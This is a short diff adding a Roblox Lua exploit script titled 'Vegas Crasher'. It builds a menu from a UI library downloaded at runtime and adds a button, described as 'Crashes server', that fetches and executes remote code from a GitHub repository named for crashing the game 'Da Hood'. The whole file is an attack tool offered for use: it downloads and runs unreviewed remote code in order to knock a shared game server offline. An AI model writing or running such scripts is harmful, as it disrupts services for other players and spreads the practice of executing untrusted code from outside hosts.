@@ -1,0 +1,10 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Vegas Crasher", "DarkTheme")
+
+local main = Window:NewTab("Vegas Crasher")
+local MainSection = main:NewSection("Vegas Crasher")
+
+
+MainSection:NewButton("Crasher", "Crashes server", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
+end)
